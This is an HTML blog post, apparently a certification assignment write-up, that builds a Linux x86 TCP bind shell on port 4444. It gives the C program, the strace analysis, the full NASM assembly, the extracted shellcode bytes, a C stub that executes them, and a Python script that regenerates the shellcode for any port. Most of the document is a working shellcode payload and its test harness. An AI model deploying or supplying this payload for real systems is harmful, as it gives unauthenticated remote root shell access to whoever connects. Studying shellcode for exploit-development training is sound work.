<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>README</title>
<!-- 2016-12-21 Wed 15:55 -->
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<meta  name="author" content="Brett Lischalk" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center; }
  .todo   { font-family: monospace; color: red; }
  .done   { color: green; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  pre.src-sh:before    { content: 'sh'; }
  pre.src-bash:before  { content: 'sh'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-R:before     { content: 'R'; }
  pre.src-perl:before  { content: 'Perl'; }
  pre.src-java:before  { content: 'Java'; }
  pre.src-sql:before   { content: 'SQL'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.right  { text-align: center;  }
  th.left   { text-align: center;   }
  th.center { text-align: center; }
  td.right  { text-align: right;  }
  td.left   { text-align: left;   }
  td.center { text-align: center; }
  dt { font-weight: bold; }
  .footpara:nth-child(2) { display: inline; }
  .footpara { display: block; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  /*]]>*/-->
</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2013 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">README</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. Assignment 1</a>
<ul>
<li><a href="#sec-1-1">1.1. Requirements</a></li>
<li><a href="#sec-1-2">1.2. Strategy</a></li>
<li><a href="#sec-1-3">1.3. The Source Code</a></li>
<li><a href="#sec-1-4">1.4. The C program</a></li>
<li><a href="#sec-1-5">1.5. Analysis of the C program</a></li>
<li><a href="#sec-1-6">1.6. Assembly: Take 1</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> Assignment 1</h2>
<div class="outline-text-2" id="text-1">
<p>
This blog post has been created for completing the requirements fo the SecurityTube
Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a>
</p>

<p>
Student ID: SLAE-824
</p>
</div>

<div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Requirements</h3>
<div class="outline-text-3" id="text-1-1">
<ul class="org-ul">
<li>Create a Shell Bind TCP shellcode
<ul class="org-ul">
<li>Bind to a port
</li>
<li>Execs Shell on incoming connection
</li>
</ul>
</li>
<li>Port number should be easily configurable
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Strategy</h3>
<div class="outline-text-3" id="text-1-2">
<p>
My approach to building a tcp bind shell shellcode will be to:
</p>

<ul class="org-ul">
<li>Create a C program which illustrates the basic functionality
</li>
<li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
</li>
<li>Lookup the system calls and see what arguments and structures they take
</li>
<li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
</li>
<li>Debug issues as of course there will be :)
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3"><span class="section-number-3">1.3</span> The Source Code</h3>
<div class="outline-text-3" id="text-1-3">
<p>
The source code and tools referenced in this article can be found here:
<a href="https://github.com/blischalk/slae/tree/master/exercise1">The Source Code and Tools</a>
</p>
</div>
</div>

<div id="outline-container-sec-1-4" class="outline-3">
<h3 id="sec-1-4"><span class="section-number-3">1.4</span> The C program</h3>
<div class="outline-text-3" id="text-1-4">
<p>
From my experience playing around with socket programming in C and
Python, there is a basic formula and group of function calls for
creating clients and servers. Most of them will be useful to us. A
couple won't be applicable to our situation.  The functions we will
find useful are:
</p>

<ul class="org-ul">
<li>Socket: Open a socket over which we will communicate. Essentially a file descriptor
</li>
<li>Bind: Bind our socket to an interface on our system
</li>
<li>Listen: Tell our system that we are ready to start accepting connections
</li>
<li>Accept: Accept the connection. This is a necessary next step as listen will generally queue up connections in anticipation of them being accepted
</li>
</ul>

<p>
Functions we won't worry about:
</p>

<ul class="org-ul">
<li>Send
</li>
<li>Recv
</li>
<li>Connect
</li>
<li>Close
</li>
</ul>

<p>
We won't worry about send or recv because they are used for managing
the flow of data coming in and out and acting accordingly.  We are
instead going to just redirect stdin, stdout, and stderr over the
socket using a function called dup2 and not worry about managing the
flow of data. Since we aren't connecting to another system/server we
don't need to worry about connect. And as for close, it is generally
good practice to close files after your done with them but one leaked
file descriptor won't hurt anyone right? We need to trim the fat!
</p>

<p>
The final step after we get our redirection going is we just need to
run a program, in our case <code>/bin/sh</code> and its output and input should
be connected to our socket. We can run this program using <code>execve</code>.
</p>

<p>
So lets get some code going!
</p>

<div class="org-src-container">

<pre class="src src-c" id="bindshell.c">  #include &lt;stdio.h&gt;
  #include &lt;netinet/in.h&gt;
  #define PORT 4444

  int main(int argc, char **argv) {
    // Create a socket
    int lsock = socket(AF_INET, SOCK_STREAM, 0);

    // Setup servr side config struct
    // We configure:
    // The family:IPv4
    // The interface: 0.0.0.0 (any)
    // The port: port#
    struct sockaddr_in config;
    config.sin_family = AF_INET;
    config.sin_addr.s_addr = INADDR_ANY;
    // The htons() function converts the
    // unsigned short integer hostshort from host byte
    // order to network byte order.
    config.sin_port = htons(PORT);

    // Bind the created socket with the interface
    // specified in the configuration
    bind(lsock, (struct sockaddr *)&amp;config, sizeof(config));

    // Listen on the socket
    listen(lsock, 0);

    // Accept the incoming connection
    int csock = accept(lsock, NULL, NULL);

    // Redirect stdin, stdout, and stderror
    dup2(csock, 0);
    dup2(csock, 1);
    dup2(csock, 2);

    // Execute a shell
    execve("/bin/sh", NULL, NULL);
};
</pre>
</div>

<p>
Compiling this code with <code>gcc bindshell.c -o bindshell</code> gives us a
nice executable. Running the executable with <code>./bindshell</code> and then
looking at our network using <code>netstat -antp</code> yields something very
interesting&#x2026;
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netstat-output">root@blahblah:~# netstat -atp Active Internet connections (servers and
established) Proto Local Address Foreign Address State PID/Program
name tcp *:4444 *:* LISTEN 1657/bindshell
</pre>
</div>

<p>
Excellent! We have /bin/sh listen bound to a port. If we open up
another terminal and use netcat to connect to port 4444 by running <code>nc
-nv -nv 127.0.0.1 4444</code> we will get:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netcat-output">root@blahblah:~# nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?)
open id uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Perfect! We have a tcp bind shell connection. Now we have to convert
this to assembly&#x2026;
</p>
</div>
</div>

<div id="outline-container-sec-1-5" class="outline-3">
<h3 id="sec-1-5"><span class="section-number-3">1.5</span> Analysis of the C program</h3>
<div class="outline-text-3" id="text-1-5">
<p>
We can use a tool called <code>strace</code> to help us learn more about what system calls
our bind shell c program is making. Running <code>strace ./bindshell</code>, connecting
to the bindshell with <code>nc -nv 127.0.0.1 4444</code> and filtering out the noise
we will see:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="strace-bindshell">root@blahblah:~/shared/SLAE/slae/exercise1# strace ./bindshell
execve("./bindshell", ["./bindshell"], [/* 41 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept(3,
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", [0], [/* 0 vars */])  = 0
</pre>
</div>

<p>
Ok. It looks like our code makes some system calls that seem to align with the
functions we know to be part of our socket programming formula along with the
stdin, stdout, and stderror redirection and our <code>execve</code> call to run /bin/sh.
</p>

<p>
Lets lookup the system calls to find out their system call numbers. We will
consult <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> for these numbers&#x2026;
</p>

<p>
When we consult the listing of syscalls we encounter a bit of confusion. The
only system calls that seem to closely match up with what we saw in our strace
are:
</p>

<div class="org-src-container">

<pre class="src src-c" id="syscall-numbers">#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
#define __NR_mbind 274
</pre>
</div>

<p>
This is strange. <code>execve</code> and <code>dup2</code> look good but there doesn't seem to be
any syscall numbers for socket,listen, or accept. socketcall seems a bit odd
as does mbind so we will have to look into this.
</p>

<p>
Consulting <code>man socketcall</code> we learn:
</p>

<div class="org-src-container">

<pre class="src src-c" id="man-socketcall">int socketcall(int call, unsigned long *args);

/**
socketcall() is a common kernel entry point for the socket system
calls.  call determines which socket function to invoke.  args points
to a block containing the actual arguments, which are passed through
to the appropriate call.

User programs should call the appropriate functions by their usual
names.  Only standard library implementors and kernel hackers need to
know about socketcall().
**/
</pre>
</div>

<p>
So that seems to explain things a little bit. The first argument to
socketcall is a number that represents the actual socket api function
that we want to be calling. Ok&#x2026; Where do we get the number associated
with each of the api calls?
</p>

<p>
A little Google search for socketcall call numbers brings us:
</p>

<p>
<a href="http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html">socketcall call numbers</a>
</p>

<p>
In this blog post we confirm our knowledge about the first argument of
socketcall as well as learn about <code>/usr/include/linux/net.h</code>
</p>

<p>
Lets checkout that file and see if we can learn the numbers we are looking
for.
</p>

<div class="org-src-container">

<pre class="src src-c" id="net.h">#define SYS_SOCKET  1   /* sys_socket(2)    */
#define SYS_BIND    2   /* sys_bind(2)      */
#define SYS_CONNECT 3   /* sys_connect(2)   */
#define SYS_LISTEN  4   /* sys_listen(2)    */
#define SYS_ACCEPT  5   /* sys_accept(2)    */
// ... snip
</pre>
</div>

<p>
So it looks like the <code>mbind</code> syscall we saw earlier might not be
necessary as it looks like there is a <code>bind</code> syscall number that we
can call with <code>socketcall</code>.  We'll try that out and see how that goes.
</p>

<p>
Now that we know the syscalls and their corresponding numbers, we need
to figure out their function signatures so that we know what sort of
arguments we need to be passing to them when we invoke them. The
metnod signatures look like the following:
</p>


<div class="org-src-container">

<pre class="src src-c" id="signatures">int socketcall(int call, unsigned long *args);
int socket(int domain, int type, int protocol);
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int listen(int sockfd, int backlog);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
int dup2(int oldfd, int newfd);
int execve(const char *filename, char *const argv[], char *const envp[]);
// ... snip
</pre>
</div>

<p>
We also leveraged 2 structs in our C program which we will most likely need
to replicate.
</p>

<div class="org-src-container">

<pre class="src src-c" id="netinet/in.h">#include &lt;netinet/in.h&gt;

// All pointers to socket address structures are often cast to pointers
// to this type before use in various functions and system calls:

struct sockaddr {
    unsigned short    sa_family;    // address family, AF_xxx
    char              sa_data[14];  // 14 bytes of protocol address
};


// IPv4 AF_INET sockets:

struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
</pre>
</div>


<p>
Ok&#x2026; Using what we have gathered from our analysis lets take an attempt at
writing some assembly!
</p>
</div>
</div>

<div id="outline-container-sec-1-6" class="outline-3">
<h3 id="sec-1-6"><span class="section-number-3">1.6</span> Assembly: Take 1</h3>
<div class="outline-text-3" id="text-1-6">
<p>
Lets lookup some values of constants:
</p>

<div class="org-src-container">

<pre class="src src-sh">~/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h~
</pre>
</div>

<div class="org-src-container">

<pre class="src src-c" id="/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h">#define AF_INET   2 /* Internet IP Protocol   */
</pre>
</div>

<p>
I had a hard time finding where <code>SOCK_STREAM</code> was defined so we use
a little gcc magic to see what the macro expands to:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="gcc-macro-expansion">root@blahblah:~/shared/SLAE/slae/exercise1# gcc -DN -E bindshell.c | grep SOCK_STREAM
SOCK_STREAM = 1,
int lsock = socket(2, SOCK_STREAM, 0);
</pre>
</div>

<div class="org-src-container">

<pre class="src src-c" id="/usr/include/netinet/in.h">#define INADDR_ANY ((unsigned long int) 0x00000000)
</pre>
</div>

<div class="org-src-container">

<pre class="src src-nasm" id="bindshellasm.nasm">global _start
;; Note: We will store 2 file descriptors along the way
;; We will put the listening socket file descriptor in edi
;; We will put the connection socket file descriptor in ebx

section .text
  _start:
    ;; Create a socket
    ;; int socketcall(int call, unsigned long *args);
    ;; int socket(int domain, int type, int protocol);
    ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x1 ; sys_socket syscall number

    ;; Put the socket() args on the stack
    xor ecx, ecx
    push ecx ; Specify protocol as 0
    push ebx ; SOCK_STREAM is the type of socket 1
    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2

    mov ecx, esp ; Save pointer to args for the socket() call
    int 0x80 ; call sys_socket

    ; Save the returned listening socket file descriptor
    xor edi, edi
    mov edi, eax

    ;; Bind the socket
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x2 ; sys_bind syscall number

    ;; Start building the sockaddr_in structure
    ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; sin_addr=0 (INADDR_ANY)
    ; INADDR_ANY Accept on any interface 0x00000000
    xor ecx, ecx
    push ecx

    ;; 4444 is 0x115c in little endian. Network byte order is
    ;; Big endian so we swap the byte ordering
    push word 0x5c11 ; sin_port=4444 (network byte order)
    push word bx     ; sin_family=AF_INET (0x2)
    mov ecx, esp     ; move pointer to sockaddr_in structure

    ;; In the initial code we use sizeof to derive the addrlen
    ;; If we print the results of that we get 0x10 which is 16 bytes
    push 0x10 ;addrlen=16
    push ecx  ;struct sockaddr pointer
    push edi  ;sockfd
    mov ecx, esp ;save pointer to bind() args
    int 0x80 ; call sys_bind

    ;; Call listen and prepare for accepting connections
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x4 ; sys_listen syscall number

    ;; Place listen's arguments on the stack
    xor ecx, ecx
    push ecx ; backlog we set to zero
    push edi ; push the socket file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_listen

    ;; Call accept
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x5 ; sys_accept syscall number
    ;; Place accept's arguments on the stack
    ;; We don't need a peer socket???... so we
    ;; use nulls for addrlen and sockaddr struct
    xor ecx, ecx
    push ecx ; Push NULL (0x00000000) for addrlen
    push ecx ; Push NULL (0x00000000) for sockaddr struct
    push edi ; Push the listening sockets file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_accept

    ;; Save the returned connection socket file descriptor
    xor ebx, ebx
    mov ebx, eax

    ;; Call dup2 for stdin, stdout, and stderr in a loop
    xor ecx, ecx
    mov cl, 0x2 ;loop counter
  dup2:
    mov al, 0x3f ;dup2
    int 0x80
    dec ecx
    jns dup2

    ;; Call execve
    xor eax, eax
    mov al, 0xb ;execve
    xor ebx, ebx
    push ebx
    push 0x68732f2f ;"sh//"
    push 0x6e69622f ;"nib/"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
</pre>
</div>

<p>
When we compile the above shellcode using the compile.sh script below:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="compile-assembly-script">#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
</pre>
</div>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise1# ./compile.sh bindshellasm</code>
</p>

<p>
And run the shellcode using:
</p>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise1# ./bindshellasm</code>
</p>

<p>
And connect using netcat:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netcat-bind-connection">#!/bin/bash
root@blahblah:~/shared/SLAE/slae/exercise1# nc -nv 127.0.0.1 4444
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Bingo! Our assembly works and gives us a tcp bind shell. Now we need to test it
in our c program stub. We will use some command line fu to get the opcodes
from our binary:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="compile-assembly-script">root@funos:~/shared/SLAE/slae/exercise1# objdump -d ./bindshellasm|grep '[0-9a-f]:'| \
grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '\
|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
"\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
"\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
</pre>
</div>

<p>
We add our opcodes to a stub tester C program:
</p>

<div class="org-src-container">

<pre class="src src-C" id="shellcode.c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
"\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
"\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

  int (*ret)() = (int(*)())code;

  ret();

}
</pre>
</div>

<p>
Compile with: <code>gcc shellcode.c -o shellcode</code>
Run with: <code>./shellcode</code>
Connect with: <code>nc -nv 127.0.0.1 4444</code>
</p>


<p>
And it works! We get our shell. The shellcode is 122 bytes without
really trying to optimize. We can always go back and try to
optimize. We also need to update the program to make the port number
easily configurable.
</p>

<p>
Let's write a wrapper script to set our port. We just accept the port
as a command line argument to our script and interpolate it into our
shellcode and print out the result:
</p>

<div class="org-src-container">

<pre class="src src-python" id="tcp-bind-shell.py">#!/usr/bin/python

import sys

if len(sys.argv) != 2:
  print "Fail!"

port_number     = int(sys.argv[1])
bts             = [port_number &gt;&gt; i &amp; 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b &gt; 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
joined          = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
shellcode+="\\x51\\x66\\x68" + joined + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
shellcode+="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
shellcode+="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
shellcode+="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"

print(shellcode)
</pre>
</div>

<p>
Once we have our script we print out our updated shellcode and pop it back
into our shellcode.c stub program, compile and test a connection. When we do,
we get our shell again. And even better, we can change the port to whatever we
would like to yield the proper shellcode.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Brett Lischalk</p>
<p class="date">Created: 2016-12-21 Wed 15:55</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
